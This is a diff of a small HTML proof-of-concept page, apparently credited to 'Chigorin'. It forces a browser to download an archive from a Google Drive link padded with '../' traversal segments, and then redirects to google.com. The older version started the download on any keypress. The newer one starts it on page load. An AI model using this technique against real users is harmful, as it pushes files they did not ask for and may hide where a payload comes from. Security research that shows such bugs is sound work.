@@ -1,42 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
+<meta charset="UTF-8">
+<title>Download Test</title>
+
+<script>
+function start() {
+
+    const file = "https://drive.usercontent.google.com/../../download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";
+
+    const a = document.createElement("a");
+    a.href = file;
+    a.download = "";
+    document.body.appendChild(a);
+    a.click();
+
+    setTimeout(()=>{
+        window.location.href="http://google.com/";
+    },2000);
+
+}
+</script>
 </head>
-<body>
-  <center><h2>POC by Chigorin!</h2></center>
 
-  <script>
-    // Listen to any keydown
-    window.addEventListener('keydown', function(e) {
-      // open the download
-      openWin();
-      // request fullscreen
-      //goFullScreen();
-    });
-
-    // Download helper
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-
-    // Kick off your “APK” download
-    function openWin() {
-      Puf(
-        "https://drive.usercontent.google.com/download/../../../../download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL",
-        "Downloads.rar"
-      );
-    }
-
-  </script>
-  
-
-  
+<body onload="start()">
+Downloading...
 </body>
 </html>
